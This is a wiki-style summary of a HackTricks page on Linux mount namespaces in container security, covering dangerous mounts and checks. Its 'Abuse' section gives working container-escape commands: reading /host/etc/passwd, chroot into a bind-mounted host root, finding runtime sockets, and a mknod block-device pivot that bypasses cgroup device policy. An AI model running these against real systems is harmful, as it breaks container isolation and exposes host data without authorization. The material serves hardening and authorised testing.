---
title: "HackTricks: Mount Namespace"
tags: [container-security, linux-namespaces, mount, filesystem, linux-hardening]
sources: [hacktricks-mount-namespace.md]
updated: 2026-05-01
---

# HackTricks: Mount Namespace

Source: [hacktricks-mount-namespace.md](../../raw/hacktricks-mount-namespace.md)

## Key Takeaways

The mount namespace controls the **mount table** — what paths resolve to. It is the most operationally important namespace for container filesystem security. The root filesystem, bind mounts, procfs/sysfs exposure, and runtime helper mounts are all expressed through it.

When a runtime exposes the wrong mount, the process gains visibility into host resources that the rest of the security model was not designed to protect.

## Dangerous Mount Patterns

- **Host root bind mount** (`-v /:/host`, writable `hostPath: /`) — reduces "can the container escape?" to "what useful host content is directly accessible?"
- **Host `/proc` or `/sys`** exposed directly — these are kernel/process-state interfaces, not data mounts
- **Writable root filesystem** — removes staging restrictions on persistence, helper binaries, config tampering

## Checks

```bash
mount                              # mount table overview
findmnt                            # structured mount tree
cat /proc/self/mountinfo | head    # kernel-level details incl. host vs overlay origin
```

Bind mounts from host paths, runtime state dirs, or socket locations should stand out immediately.

## Abuse

### Confirm host bind mount and writability

```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```

### Direct host access via chroot

```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```

### Runtime socket discovery

```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```

### Test mount capability (requires CAP_SYS_ADMIN)

```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```

### Two-shell mknod pivot (CTF/lab scenario)

Inside container (root can create block devices):

```bash
mknod /sda b 8 0
chmod 777 /sda
```

From host as matching low-privilege user, locate container PID and read via `/proc/<pid>/root/sda`. This bypasses cgroup device policy by using the container's device node through the host's proc view.

## Related

- [linux-namespaces](../concepts/linux-namespaces.md)
- [container-security](../concepts/container-security.md)
- [HackTricks: Sensitive Host Mounts](hacktricks-sensitive-host-mounts.md)
- [HackTricks: Linux Namespaces Overview](hacktricks-namespaces-index.md)
